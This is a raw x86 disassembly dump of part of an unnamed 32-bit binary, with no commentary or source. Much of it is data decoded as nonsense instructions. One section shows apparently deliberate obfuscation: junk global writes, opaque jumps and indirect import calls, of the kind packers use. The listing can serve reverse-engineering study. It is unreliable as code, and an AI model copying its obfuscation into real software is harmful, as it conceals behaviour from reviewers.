  412540:	imul   ebx,DWORD PTR [edi],0xf7ce5d37
  412546:	addr16 dec edx
  412548:	rcl    BYTE PTR [ecx+0x47],1
  41254b:	pop    esp
  41254c:	sub    eax,0xcd2fa5b7
  412551:	and    BYTE PTR [ebx-0x44cf2776],ch
  412557:	aaa    
  412558:	stos   BYTE PTR es:[edi],al
  412559:	stos   BYTE PTR es:[edi],al
  41255a:	inc    esp
  41255b:	call   0xb0f5:0xb31d2bee
  412562:	out    0x9,al
  412564:	adc    al,0xce
  412566:	xor    al,ah
  412568:	(bad)  
  412569:	jbe    0x4125c0
  41256b:	shl    DWORD PTR [esi],1
  41256d:	cs in  eax,dx
  41256f:	out    dx,al
  412570:	jb     0x41255c
  412572:	pop    ss
  412573:	retf   0x2d06
  412576:	in     eax,0xc5
  412578:	add    DWORD PTR ds:0x77e40bd3,0x97ddb041
  412582:	ficomp DWORD PTR [eax-0x1ad9a1ec]
  412588:	das    
  412589:	iret   
  41258a:	push   esi
  41258b:	aaa    
  41258c:	sbb    al,0x2
  41258e:	adc    al,BYTE PTR [eax-0x661400fe]
  412594:	inc    edx
  412595:	xlat   BYTE PTR ds:[ebx]
  412596:	rep outs dx,BYTE PTR ds:[esi]
  412598:	out    0xca,eax
  41259a:	jnp    0x41251c
  41259c:	mov    eax,0x3e7676eb
  4125a1:	out    dx,eax
  4125a2:	aaa    
  4125a3:	std    
  4125a4:	pop    esp
  4125a5:	mov    dh,0xa5
  4125a7:	test   BYTE PTR [esi-0x1a0123c2],dl
  4125ad:	mov    WORD PTR [ebx-0x3a0f74f7],fs
  4125b3:	xor    ah,dh
  4125b5:	mov    es,WORD PTR fs:[ecx]
  4125b8:	cmp    esp,edi
  4125ba:	cbw    
  4125bc:	cmovs  edi,DWORD PTR [eax-0x53]
  4125c0:	not    DWORD PTR [ebp+0x66e04b9a]
  4125c6:	and    ebx,DWORD PTR [edi+eiz*2-0x13]
  4125ca:	sahf   
  4125cb:	fmul   DWORD PTR [ebp-0x5e5c8949]
  4125d1:	pushf  
  4125d2:	aad    0x9c
  4125d4:	xlat   BYTE PTR ds:[ebx]
  4125d5:	jo     0x412608
  4125d7:	test   eax,0x90191191
  4125dc:	pop    ebx
  4125dd:	ins    DWORD PTR es:[edi],dx
  4125de:	out    0x32,eax
  4125e0:	lods   al,BYTE PTR ds:[esi]
  4125e1:	cmp    bl,BYTE PTR [esi+0x28e823bf]
  4125e7:	pusha  
  4125e8:	(bad)  
  4125e9:	outs   dx,BYTE PTR ds:[esi]
  4125ea:	mov    ecx,0x4bfa81fc
  4125ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125f0:	mov    al,ds:0x47c4a0a5
  4125f5:	aad    0x3a
  4125f7:	pop    esi
  4125f8:	xchg   esp,eax
  4125f9:	fst    QWORD PTR [ebp-0x6c6d6e7b]
  4125ff:	pop    ebx
  412600:	mov    al,ds:0xdd14532d
  412605:	retf   0xf0ba
  412608:	je     0x412590
  41260a:	enter  0x65b9,0x60
  41260e:	and    BYTE PTR [edi+0x9],0xee
  412612:	cmp    ah,bl
  412614:	fwait
  412615:	jmp    0xd444:0xacc10e74
  41261c:	xchg   esi,eax
  41261d:	ins    BYTE PTR es:[edi],dx
  41261e:	fadd   st,st(7)
  412620:	add    DWORD PTR [esi],esi
  412622:	lds    edx,FWORD PTR [ecx+0x49]
  412625:	sar    ecx,cl
  412627:	lock scas eax,DWORD PTR es:[edi]
  412629:	fadd   DWORD PTR [eax+0x74ffbf99]
  41262f:	cmp    ah,BYTE PTR [eax+0x2819d692]
  412635:	add    edx,DWORD PTR [edx]
  412637:	adc    DWORD PTR [ebp+esi*8-0x2e],eax
  41263b:	inc    edx
  41263c:	xchg   ecx,eax
  41263d:	out    dx,al
  41263e:	data16 bnd jnp 0x412678
  412642:	adc    al,0x4b
  412644:	fstp   DWORD PTR [ebp-0x42]
  412647:	adc    al,0x40
  412649:	mul    esi
  41264b:	aas    
  41264c:	les    edx,FWORD PTR [eax-0x47]
  41264f:	dec    esi
  412650:	(bad)  
  412651:	enter  0x15f9,0x3f
  412655:	mov    cl,BYTE PTR [esi]
  412657:	les    ecx,FWORD PTR ds:0xc086ed91
  41265d:	xchg   ebp,eax
  41265e:	(bad)  
  41265f:	pop    ebx
  412660:	cmp    eax,0x246e40cf
  412665:	and    eax,0x66bf10d0
  41266a:	dec    ebp
  41266b:	push   ss
  41266c:	jne    0x4126c8
  41266e:	clc    
  41266f:	push   0x8d310571
  412674:	sbb    eax,0x1e7eee0d
  412679:	cli    
  41267a:	dec    edi
  41267b:	add    DWORD PTR [ecx+ebp*2-0x9],edi
  41267f:	dec    ecx
  412680:	xchg   BYTE PTR [edi+0x5b],bh
  412683:	inc    ecx
  412684:	movhps QWORD PTR [ebx-0xd],xmm3
  412688:	sub    BYTE PTR [edx+0x5756f818],bl
  41268e:	xor    DWORD PTR ds:0x428505,edx
  412694:	mov    eax,DWORD PTR [ebp+0x8]
  412697:	add    ebx,DWORD PTR ds:0x428301
  41269d:	mov    ecx,DWORD PTR [ebp+0xc]
  4126a0:	and    ebx,DWORD PTR ds:0x4284f9
  4126a6:	shrd   eax,ecx,0x2
  4126aa:	xor    esi,DWORD PTR ds:0x428515
  4126b0:	shr    ecx,0x2
  4126b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4126b6:	cmp    DWORD PTR ds:0x42847d,0x0
  4126bd:	not    ebx
  4126bf:	mov    edi,0x75d4
  4126c4:	mov    DWORD PTR ds:0x42850d,0x68f
  4126ce:	mov    DWORD PTR ds:0x428519,0x72ee
  4126d8:	jmp    0x412740
  4126dd:	mov    esi,DWORD PTR ds:0x4283c9
  4126e3:	mov    DWORD PTR ds:0x428319,0x6012
  4126ed:	cmp    DWORD PTR ds:0x42847d,0x0
  4126f4:	jg     0x41272a
  4126fa:	push   0x1b53
  4126ff:	push   0x62ef
  412704:	call   DWORD PTR ds:0x42e008
  41270a:	and    edi,0x6509
  412710:	xor    edx,edx
  412712:	add    edx,DWORD PTR ds:0x428511
  412718:	and    edx,DWORD PTR ds:0x4284b1
  41271e:	mov    DWORD PTR ds:0x428511,edx
  412724:	and    edi,DWORD PTR ds:0x428301
  41272a:	adc    DWORD PTR ds:0x4282e9,edi
  412730:	add    DWORD PTR ds:0x428521,edi
  412736:	mov    DWORD PTR ds:0x428419,0x7a33
  412740:	mov    edx,DWORD PTR [ebp+0xc]
  412743:	cmp    DWORD PTR ds:0x4283f9,0x0
  41274a:	mov    DWORD PTR ds:0x4282e1,0x5b58
  412754:	not    ebx
  412756:	mov    DWORD PTR ds:0x42840d,0x50a2
  412760:	mov    DWORD PTR ds:0x4283e1,edx
  412766:	jmp    0x4127b4
  41276b:	mov    DWORD PTR ds:0x428519,0x3c96
  412775:	cmp    DWORD PTR ds:0x4283f9,0x0
  41277c:	jne    0x41279e
  412782:	push   0x428265
  412787:	push   DWORD PTR [ebp-0x1c]
  41278a:	call   DWORD PTR ds:0x42e0cc
  412790:	and    DWORD PTR ds:0x4283e1,edi
  412796:	neg    DWORD PTR ds:0x4282f5
  41279c:	not    edi
  41279e:	sbb    DWORD PTR ds:0x42831d,edx
  4127a4:	sub    edi,ebx
  4127a6:	or     DWORD PTR ds:0x4283f9,ebx
  4127ac:	xor    esi,esi
  4127ae:	or     DWORD PTR ds:0x4282e5,ecx
  4127b4:	xor    edx,edx
  4127b6:	mov    esi,0x32de6d5d
  4127bb:	sub    DWORD PTR ds:0x42830d,ecx
  4127c1:	xor    eax,esi
  4127c3:	or     eax,edx
  4127c5:	mov    DWORD PTR [ebp-0x34],eax
  4127c8:	cmp    DWORD PTR ds:0x4283f9,0x0
  4127cf:	not    ebx
  4127d1:	mov    edx,0x6453
  4127d6:	mov    ebx,DWORD PTR ds:0x42841d
  4127dc:	mov    edi,DWORD PTR ds:0x42830d
  4127e2:	jmp    0x412823
  4127e7:	mov    edi,0x4ae9
  4127ec:	cmp    DWORD PTR ds:0x4283f9,0x0
  4127f3:	jbe    0x41280b
  4127f9:	push   0x428319
  4127fe:	call   DWORD PTR ds:0x42e254
  412804:	and    ebx,DWORD PTR ds:0x4283d5
  41280a:	inc    edx
  41280b:	adc    edx,0x18bc
  412811:	mov    ebx,DWORD PTR ds:0x428499
  412817:	or     ebx,DWORD PTR ds:0x4283f1
  41281d:	mov    DWORD PTR ds:0x428499,ebx
  412823:	mov    eax,DWORD PTR [ebp+0x8]
  412826:	shl    ecx,0x1e
  412829:	mov    ecx,DWORD PTR [ebp+0xc]
  41282c:	shrd   eax,ecx,0x2
  412830:	xor    eax,esi
  412832:	add    DWORD PTR ds:0x4283e9,0x71c1
  41283c:	shr    ecx,0x2
  41283f:	cmp    DWORD PTR ds:0x4284a9,0x0
  412846:	mov    DWORD PTR ds:0x4283d1,0x17f6
  412850:	mov    DWORD PTR ds:0x4283d5,ecx
  412856:	jmp    0x41291d
  41285b:	movzx  ecx,WORD PTR ds:0x42848d
  412862:	cmp    DWORD PTR ds:0x4284a9,0x0
  412869:	jl     0x412892
  41286f:	push   DWORD PTR [ebp-0x10]
  412872:	call   DWORD PTR ds:0x42e0d0
  412878:	sub    DWORD PTR ds:0x4283cd,edi
  41287e:	xor    edx,edx
  412880:	or     edx,DWORD PTR ds:0x428375
  412886:	mov    edi,DWORD PTR ds:0x4284d5
  41288c:	sub    edx,edi
  41288e:	sub    edx,DWORD PTR [edx+edi*1]
  412891:	inc    edx
  412892:	inc    edx
  412893:	or     DWORD PTR ds:0x428475,0x781a
  41289d:	adc    edi,DWORD PTR ds:0x428505
  4128a3:	sbb    ebx,DWORD PTR ds:0x428515
  4128a9:	cmp    DWORD PTR ds:0x428419,0x0
  4128b0:	mov    DWORD PTR ds:0x4284a5,0x3519
  4128ba:	mov    DWORD PTR ds:0x42851d,edx
  4128c0:	jmp    0x41291d
  4128c5:	mov    edi,DWORD PTR ds:0x4283f5
  4128cb:	mov    DWORD PTR ds:0x428311,0x6a8c
  4128d5:	cmp    DWORD PTR ds:0x428419,0x0
  4128dc:	jae    0x412909
  4128e2:	push   0x74d4
  4128e7:	push   DWORD PTR [ebp-0x24]
  4128ea:	call   DWORD PTR ds:0x42e00c
  4128f0:	xor    ecx,ecx
  4128f2:	or     ecx,DWORD PTR ds:0x428461
  4128f8:	mov    edi,DWORD PTR ds:0x42856d
  4128fe:	sub    ecx,edi
  412900:	add    ecx,DWORD PTR [ecx+edi*1]
  412903:	xor    DWORD PTR ds:0x4284f9,ebx
  412909:	add    DWORD PTR ds:0x42850d,edx
  41290f:	sub    edi,DWORD PTR ds:0x4284a9
  412915:	neg    edx
  412917:	sub    ecx,DWORD PTR ds:0x428509
  41291d:	mov    ecx,DWORD PTR [ebp+0x8]
  412920:	cmp    DWORD PTR ds:0x428511,0x0
  412927:	movzx  edx,BYTE PTR ds:0x4283c1
  41292e:	mov    edi,DWORD PTR ds:0x428401
  412934:	jmp    0x41298c
  412939:	mov    DWORD PTR ds:0x42849d,0x3a54
  412943:	mov    DWORD PTR ds:0x4282f5,0x35a1
  41294d:	cmp    DWORD PTR ds:0x428511,0x0
  412954:	jbe    0x412981
  41295a:	push   0x731e
  41295f:	push   DWORD PTR [ebp-0x1c]
  412962:	push   0x5d33
  412967:	push   DWORD PTR [ebp-0x28]
  41296a:	push   DWORD PTR [ebp-0x20]
  41296d:	call   DWORD PTR ds:0x42e0d4
  412973:	and    edx,edi
  412975:	and    DWORD PTR ds:0x428495,ebx
  41297b:	sbb    edi,0x47ca
  412981:	inc    edx
  412982:	add    DWORD PTR ds:0x4282f5,0x615e
  41298c:	mov    edx,DWORD PTR [ebp+0xc]
  41298f:	xor    ebx,ebx
  412991:	add    ebx,DWORD PTR ds:0x428341
  412997:	mov    edi,DWORD PTR ds:0x42853d
  41299d:	sub    edi,ebx
  41299f:	or     ebx,DWORD PTR [ebx+edi*1]
  4129a2:	xor    edx,edx
  4129a4:	xor    DWORD PTR ds:0x428419,ebx
  4129aa:	or     eax,edx
  4129ac:	adc    edx,0x4918
  4129b2:	mov    DWORD PTR [ebp-0x34],eax
  4129b5:	sub    ebx,edx
  4129b7:	mov    eax,ds:0x422538
  4129bc:	mov    eax,DWORD PTR [eax]
  4129be:	mov    DWORD PTR [ebp-0x28],eax
  4129c1:	mov    eax,ds:0x422758
  4129c6:	mov    eax,DWORD PTR [eax]
  4129c8:	xor    edx,edx
  4129ca:	mov    DWORD PTR [ebp-0x20],eax
  4129cd:	mov    ebx,DWORD PTR ds:0x42844d
  4129d3:	mov    ebx,DWORD PTR [ebx]
  4129d5:	sub    DWORD PTR ds:0x42848d,ebx
  4129db:	mov    eax,DWORD PTR [ebp-0x28]
  4129de:	mov    eax,DWORD PTR [ebp-0x28]
  4129e1:	xor    edx,edx
  4129e3:	mov    ebx,DWORD PTR [ebp+0x8]
  4129e6:	movzx  edx,BYTE PTR ds:0x428485
  4129ed:	sbb    DWORD PTR ds:0x428311,edx
  4129f3:	shl    ecx,0x1e
  4129f6:	mov    edi,DWORD PTR ds:0x4282ed
  4129fc:	adc    DWORD PTR ds:0x428325,edi
  412a02:	xor    ecx,ecx
  412a04:	and    DWORD PTR ds:0x4282e5,ecx
  412a0a:	shld   ecx,eax,0x2
  412a0e:	jmp    0x412d47
  412a13:	scas   eax,DWORD PTR es:[edi]
  412a14:	cdq    
  412a15:	and    esp,ecx
  412a17:	sub    edi,DWORD PTR [eax+esi*4-0x64]
  412a1b:	push   ecx
  412a1c:	mov    edx,0x748f90d1
  412a21:	mul    BYTE PTR [esp+ebx*2-0x1241418e]
  412a28:	les    edi,FWORD PTR [esi-0x585d2f42]
  412a2e:	xchg   ebx,eax
  412a2f:	mov    esi,edi
  412a31:	std    
  412a32:	adc    al,0xca
  412a34:	push   eax
  412a35:	and    eax,0xfbc81652
  412a3a:	cmp    DWORD PTR [ecx],edi
  412a3c:	mov    dl,0x2a
  412a3e:	scas   al,BYTE PTR es:[edi]
  412a3f:	pop    edx
  412a40:	pop    ebx
  412a41:	(bad)  
  412a42:	mov    WORD PTR [ecx],es
  412a44:	ins    DWORD PTR es:[edi],dx
  412a45:	adc    edx,DWORD PTR [edi]
  412a47:	cld    
  412a48:	ins    BYTE PTR es:[edi],dx
  412a49:	inc    edx
  412a4a:	rcl    DWORD PTR [ebx-0x65f83a74],0x7
  412a51:	or     eax,ebp
  412a53:	scas   al,BYTE PTR es:[edi]
  412a54:	inc    edi
  412a55:	xor    al,dh
  412a57:	out    dx,eax
  412a58:	jbe    0x412acd
  412a5a:	jmp    0x412a9f
  412a5c:	push   es
  412a5d:	call   0x6b1e0288
  412a62:	or     al,0x30
  412a64:	(bad)  
  412a65:	lahf   
  412a66:	adc    cl,al
  412a68:	adc    esp,DWORD PTR [esi]
  412a6a:	(bad)  
  412a6b:	mov    ah,0x52
  412a6d:	ret    
  412a6e:	stos   DWORD PTR es:[edi],eax
  412a6f:	adc    al,0x76
  412a71:	shl    ecx,cl
  412a73:	in     eax,0x8c
  412a75:	pop    ss
  412a76:	xor    BYTE PTR [ebp-0x44],bh
  412a79:	xchg   dh,dh
  412a7b:	(bad)  
  412a7c:	mov    edi,0x679e1049
  412a81:	jg     0x412a59
  412a83:	xor    esp,DWORD PTR [ebx+ebp*2+0x38]
  412a87:	pop    ecx
  412a88:	sub    ebx,edi
  412a8a:	test   DWORD PTR [edi+0x7dddcf2],esi
  412a90:	loopne 0x412a44
  412a92:	inc    ecx
  412a93:	fld    TBYTE PTR [edi+0x74]
  412a96:	sub    BYTE PTR [ecx+0x74],0xc0
  412a9a:	push   0xffffffe1
  412a9c:	ret    0xf465
  412a9f:	inc    ebx
  412aa0:	enter  0x703f,0xd0
  412aa4:	and    eax,0x3f30b7e9
  412aa9:	popa   
  412aaa:	lahf   
  412aab:	gs ror esp,1
  412aae:	and    esp,DWORD PTR ds:0x1544b8dd
  412ab4:	clc    
  412ab5:	adc    al,0xff
  412ab7:	ins    BYTE PTR es:[edi],dx
  412ab8:	das    
  412ab9:	push   edx
  412aba:	scas   al,BYTE PTR es:[edi]
  412abb:	lea    ebx,[ecx]
  412abd:	cmp    cl,bh
  412abf:	adc    edx,esi
  412ac1:	dec    eax
  412ac2:	mov    DWORD PTR [edi],ebx
  412ac4:	mov    edx,0x2163602f
  412ac9:	xchg   ecx,eax
  412aca:	fnsave [ebp+esi*8-0x15ffd22b]
  412ad1:	and    eax,edx
  412ad3:	mov    dh,0x94
  412ad5:	push   cs
  412ad6:	mov    dl,0x5
  412ad8:	mov    edi,0xd278a660
  412add:	mov    ecx,0xa0e8ed6c
  412ae2:	popa   
  412ae3:	xchg   BYTE PTR [eax-0x12],al
  412ae6:	daa    
  412ae7:	xchg   edx,eax
  412ae8:	sbb    DWORD PTR [ebx],esi
  412aea:	test   DWORD PTR [ebp-0x9],ebx
  412aed:	adc    eax,0x908a6e34
  412af2:	shl    DWORD PTR fs:[bp+0x3411],cl
  412af8:	xor    eax,0xda34c4b4
  412afd:	or     ecx,ebp
  412aff:	pop    ebp
  412b00:	xor    ch,cl
  412b02:	jae    0x412b75
  412b04:	pop    ebp
  412b05:	push   ecx
  412b06:	lods   al,BYTE PTR ds:[esi]
  412b07:	out    dx,al
  412b08:	jnp    0x412aa9
  412b0a:	cdq    
  412b0b:	pop    ebx
  412b0c:	shl    esi,cl
  412b0e:	jnp    0x412b07
  412b10:	push   edx
  412b11:	mov    dl,0xab
  412b13:	hlt    
  412b14:	shl    DWORD PTR [eax],1
  412b16:	add    DWORD PTR [esi],eax
  412b18:	or     al,bh
  412b1a:	in     eax,0x71
  412b1c:	sub    ebp,DWORD PTR [ecx-0x53a7b0a9]
  412b22:	iret   
  412b23:	pop    edx
  412b24:	pop    edi
  412b25:	fild   DWORD PTR [edi-0x51252be2]
  412b2b:	setl   BYTE PTR [edi]
  412b2e:	(bad)  
  412b2f:	out    dx,al
  412b30:	xor    edi,DWORD PTR [ebx-0x15]
  412b33:	cmp    dh,ch
  412b35:	cmp    dh,BYTE PTR [ecx]
  412b37:	rol    DWORD PTR [edi+eiz*8],0xb0
  412b3b:	xchg   ebp,eax
  412b3c:	test   BYTE PTR [ebx-0x65f444a],al
  412b42:	adc    al,0x8f
  412b44:	das    
  412b45:	mov    eax,ds:0x959b5799
  412b4a:	cmp    cl,bh
  412b4c:	cs add al,0xcf
  412b4f:	scas   al,BYTE PTR es:[edi]
  412b50:	push   edx
  412b51:	cld    
  412b52:	clc    
  412b53:	sahf   
  412b54:	inc    esi
  412b55:	std    
  412b56:	les    edi,FWORD PTR [ebp+0x6f0dd0e]
  412b5c:	(bad)  
  412b5d:	jmp    0x412bbf
  412b5f:	cmp    eax,0x23d5c93c
  412b64:	jmp    0x9577:0xfa241b87
  412b6b:	out    0xe9,eax
  412b6d:	fild   WORD PTR [esp+edi*4-0x42]
  412b71:	mov    bl,0x24
  412b73:	popf   
  412b74:	addr16 inc ecx
  412b76:	les    esp,FWORD PTR es:[edx-0x733f1442]
  412b7d:	xor    ch,BYTE PTR [ebx+0xf4c6681]
  412b83:	sbb    ebp,ecx
  412b85:	pop    ebp
  412b86:	dec    ebp
  412b87:	call   0x5ce1:0xcfbb05bc
  412b8e:	cmc    
  412b8f:	in     eax,0x7d
  412b91:	add    WORD PTR [ecx-0x46898230],sp
  412b98:	sbb    BYTE PTR [eax+0x3f001396],bh
  412b9e:	add    BYTE PTR [ebp+0x421e3af4],0x6f
  412ba5:	stos   DWORD PTR es:[edi],eax
  412ba6:	or     al,0x4a
  412ba8:	mov    ebx,DWORD PTR [ecx+0x79]
  412bab:	push   ebx
  412bac:	(bad)  
  412bad:	adc    cl,dh
  412baf:	imul   edi,DWORD PTR [edx],0x7c201d6d
  412bb5:	dec    edx
  412bb6:	push   eax
  412bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bb8:	mov    al,ds:0x248b18d8
  412bbd:	sbb    esp,DWORD PTR [eax-0x6a974f17]
  412bc3:	cmp    eax,0x1d051a88
  412bc8:	add    DWORD PTR [ebx-0xc8c7fce],edx
  412bce:	out    0xcd,eax
  412bd0:	sti    
  412bd1:	cmp    BYTE PTR ds:0x69b7ba5a,0xa9
  412bd8:	xor    al,0x3a
  412bda:	mov    cl,0x52
  412bdc:	adc    bl,cl
  412bde:	inc    edi
  412bdf:	and    BYTE PTR [eax+0x12],dl
  412be2:	ja     0x412bc4
  412be4:	push   ecx
  412be5:	enter  0x3bfc,0x6b
  412be9:	cs push eax
  412beb:	mul    bl
  412bed:	clc    
  412bee:	pop    esi
  412bef:	pop    ss
  412bf0:	rcr    DWORD PTR [edx+esi*4-0x72],0x62
  412bf5:	ins    BYTE PTR es:[edi],dx
  412bf6:	sbb    esi,DWORD PTR [esi-0x477e43b]
  412bfc:	jl     0x412c4a
  412bfe:	push   ebp
  412bff:	xchg   ebp,eax
  412c00:	in     al,dx
  412c01:	ret    0x73d3
  412c04:	(bad)  
  412c06:	cwde   
  412c07:	in     eax,0xb5
  412c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c0a:	ffreep st(1)
  412c0c:	stos   BYTE PTR es:[edi],al
  412c0d:	jge    0x412c70
  412c0f:	and    DWORD PTR [ebp-0x7d29c8a7],ebx
  412c15:	jmp    0x412c0c
  412c17:	enter  0xaae8,0xc8
  412c1b:	stc    
  412c1c:	jp     0x412c9c
  412c1e:	out    0x14,eax
  412c20:	xor    DWORD PTR [eax+0x3f283e3a],ebp
  412c26:	out    dx,eax
  412c27:	adc    BYTE PTR [ecx],cl
  412c29:	dec    esp
  412c2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c2b:	or     DWORD PTR [eax],edi
  412c2d:	push   edi
  412c2e:	jg     0x412c2a
  412c30:	inc    edi
  412c31:	fiadd  DWORD PTR [edi+0x18]
  412c34:	ins    DWORD PTR es:[edi],dx
  412c35:	or     DWORD PTR [ebx],ebp
  412c37:	add    eax,0x218c9c
  412c3c:	xchg   ecx,eax
  412c3d:	mov    bl,BYTE PTR fs:[edi-0x8b59ca0]
  412c44:	es mov dh,0xa7
  412c47:	call   0x4197:0x81f66457
  412c4e:	clc    
  412c4f:	(bad)  
  412c50:	gs adc edx,ebp
  412c53:	bound  ecx,QWORD PTR [ebp-0x7b654e88]
  412c59:	xchg   edi,eax
  412c5a:	cmp    al,0x86
  412c5c:	add    bh,ch
  412c5e:	imul   ebx,DWORD PTR [eax-0x35],0xffffff9a
  412c62:	js     0x412c4e
  412c64:	fisubr DWORD PTR [eax]
  412c66:	and    al,0xd4
  412c68:	mov    ebx,0xc91a417d
  412c6d:	xchg   esi,eax
  412c6e:	pop    ds
  412c6f:	scas   eax,DWORD PTR es:[edi]
  412c70:	mov    eax,ds:0x2d7669bf
  412c75:	retf   
  412c76:	cdq    
  412c77:	in     eax,0x6e
  412c79:	cs or  al,0xfd
  412c7c:	or     eax,0xee4b74e2
  412c81:	cmp    DWORD PTR ds:0x4e540e68,ebp
  412c87:	sbb    ebp,DWORD PTR [ecx+0x71]
  412c8a:	test   BYTE PTR [eax-0x1b],ah
  412c8d:	enter  0x348e,0xc8
  412c91:	nop
  412c92:	xchg   edi,eax
  412c93:	xchg   DWORD PTR [esi-0x25],esi
  412c96:	sub    al,0x24
  412c98:	mov    WORD PTR [ecx+ebx*4],ss
  412c9b:	xor    eax,0x428657b8
  412ca0:	add    DWORD PTR [ebp+0x5272857e],esi
  412ca6:	push   esi
  412ca7:	inc    ebx
  412ca8:	fdiv   QWORD PTR [ecx+0x7180fac0]
  412cae:	dec    esp
  412caf:	test   al,0x75
  412cb1:	sbb    DWORD PTR [ebx+0x5d],edx
  412cb4:	jecxz  0x412c93
  412cb6:	or     al,0x95
  412cb8:	or     edi,DWORD PTR [edx+0x73]
  412cbb:	inc    esi
  412cbc:	sbb    ch,bl
  412cbe:	(bad)  
  412cbf:	rol    DWORD PTR [ebp+0x37],0x2c
  412cc3:	dec    edi
  412cc4:	mov    edx,0xe15db7c2
  412cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ccb:	xor    eax,0x7dcbe02b
  412cd0:	mov    al,ds:0xcef0dcc4
  412cd5:	mov    DWORD PTR ds:0xc0eb2bd7,esi
  412cdb:	xor    al,0x8f
  412cdd:	or     cl,dl
  412cdf:	mov    ds:0x17d86a1f,eax
  412ce4:	ja     0x412d3a
  412ce6:	jle    0x412d2a
  412ce8:	xchg   ebx,eax
  412ce9:	mov    ds:0xa2333a93,al
  412cee:	push   edx
  412cef:	enter  0x446f,0x9b
  412cf3:	std    
  412cf4:	cmp    edi,ebx
  412cf6:	add    DWORD PTR [eax],edi
  412cf8:	(bad)  
  412cf9:	jns    0x412cdf
  412cfb:	xchg   esi,eax
  412cfc:	out    dx,eax
  412cfd:	add    DWORD PTR [ebx+0x0],ebp
  412d00:	jge    0x412d75
  412d02:	adc    BYTE PTR [edi],ah
  412d04:	xor    ebx,DWORD PTR [eax-0x2e]
  412d07:	aam    0x6b
  412d09:	sbb    BYTE PTR [edx+edx*8-0x78ac8add],0x18
  412d11:	les    ebp,FWORD PTR [esi+0x61]
  412d14:	sbb    eax,0xf43e34a9
  412d19:	cmp    BYTE PTR [edx],dl
  412d1b:	test   DWORD PTR [esi],ebx
  412d1d:	push   0x6b
  412d1f:	inc    eax
  412d20:	cld    
  412d21:	js     0x412d91
  412d23:	xor    BYTE PTR [esi+0x3ab09633],dh
  412d29:	dec    ecx
  412d2a:	or     eax,0x47d40cf1
  412d2f:	sbb    ch,BYTE PTR [edx-0x2554a7b0]
  412d35:	mov    BYTE PTR [edi-0x3204ec83],ah
  412d3b:	fwait
  412d3c:	mov    bl,0x5e
  412d3e:	dec    ebx
  412d3f:	enter  0xb969,0x23
  412d43:	(bad)  
  412d44:	data16 ffreep st(2)
  412d47:	shl    eax,0x2
  412d4a:	and    edi,edi
  412d4c:	mov    edi,0xcb79b576
  412d51:	mov    edx,0x9c2b8ae8
  412d56:	mov    DWORD PTR [ebp-0x10],ebx
  412d59:	mov    DWORD PTR ds:0x428415,0xc27
  412d63:	mov    ebx,DWORD PTR [ebp+0xc]
  412d66:	xor    eax,edi
  412d68:	xor    DWORD PTR ds:0x4283dd,0x622f
  412d72:	xor    ecx,edx
  412d74:	mov    DWORD PTR ds:0x428415,0x97b
  412d7e:	mov    DWORD PTR [ebp-0x18],0xa5069aae
  412d85:	mov    DWORD PTR ds:0x42852d,0x75c6
  412d8f:	mov    DWORD PTR [ebp-0x1c],0xa50693ae
  412d96:	mov    DWORD PTR [ebp-0xc],ebx
  412d99:	mov    DWORD PTR ds:0x428509,0x6dfc
  412da3:	cmp    eax,DWORD PTR [ebp-0x10]
  412da6:	jne    0x412db4
  412dac:	cmp    ecx,ebx
  412dae:	je     0x414af6
  412db4:	mov    eax,DWORD PTR [ebp-0x20]
  412db7:	sub    eax,0x3b59
  412dbc:	mov    eax,DWORD PTR [ebp-0x20]
  412dbf:	xor    ecx,ecx
  412dc1:	shld   ecx,eax,0x2
  412dc5:	xor    DWORD PTR ds:0x4283c1,0x428499
  412dcf:	shl    eax,0x2
  412dd2:	add    DWORD PTR ds:0x4283f9,0x428491
  412ddc:	xor    ecx,edx
  412dde:	cmp    DWORD PTR ds:0x428491,0x0
  412de5:	not    edx
  412de7:	not    edx
  412de9:	jmp    0x412e3e
  412dee:	mov    DWORD PTR ds:0x42850d,edx
  412df4:	not    edx
  412df6:	cmp    DWORD PTR ds:0x428491,0x0
  412dfd:	je     0x412e29
  412e03:	push   0x8204
  412e08:	push   DWORD PTR [ebp-0x28]
  412e0b:	call   DWORD PTR ds:0x42e010
  412e11:	mov    edx,DWORD PTR ds:0x4283d9
  412e17:	xor    DWORD PTR ds:0x428509,edx
  412e1d:	mov    edx,DWORD PTR ds:0x428529
  412e23:	sub    DWORD PTR ds:0x428525,edx
  412e29:	inc    edx
  412e2a:	adc    edx,DWORD PTR ds:0x428525
  412e30:	xor    edx,edx
  412e32:	xor    edx,DWORD PTR ds:0x428421
  412e38:	adc    DWORD PTR ds:0x428519,edx
  412e3e:	mov    edx,DWORD PTR [ebp+0x8]
  412e41:	xor    eax,edi
  412e43:	mov    edi,DWORD PTR [ebp+0xc]
  412e46:	mov    DWORD PTR ds:0x428311,0x757
  412e50:	cmp    eax,edx
  412e52:	mov    DWORD PTR ds:0x4282e1,0x1fab
  412e5c:	jne    0x412e74
  412e62:	cmp    ecx,edi
  412e64:	mov    DWORD PTR ds:0x428325,0x4385
  412e6e:	je     0x414af6
  412e74:	add    eax,DWORD PTR ds:0x4283e1
  412e7a:	mov    eax,DWORD PTR [ebp-0x1c]
  412e7d:	neg    DWORD PTR ds:0x4282e9
  412e83:	mov    ecx,DWORD PTR [ebp-0x1c]
  412e86:	push   0xfffffffe
  412e88:	and    DWORD PTR ds:0x428321,edx
  412e8e:	pop    ebx
  412e8f:	or     DWORD PTR ds:0x42852d,edx
  412e95:	jmp    0x4131ce
  412e9a:	imul   ebx,DWORD PTR [edi+0x1cbccb74],0xf12aa079
  412ea4:	and    BYTE PTR [esi-0x61af333d],bl
  412eaa:	mov    WORD PTR [eax-0x42],?
  412ead:	mov    esi,0xbebec4ed
  412eb2:	add    BYTE PTR [edi-0x5b4776ff],bh
  412eb8:	pop    ss
  412eb9:	retf   
  412eba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ebb:	arpl   WORD PTR [eax+ecx*4+0x393243d8],ax
  412ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ec3:	mov    ebp,0xb7dcd939
  412ec8:	mov    ch,0xa
  412eca:	fidiv  DWORD PTR [ebp+0xd03663b]
  412ed0:	cmc    
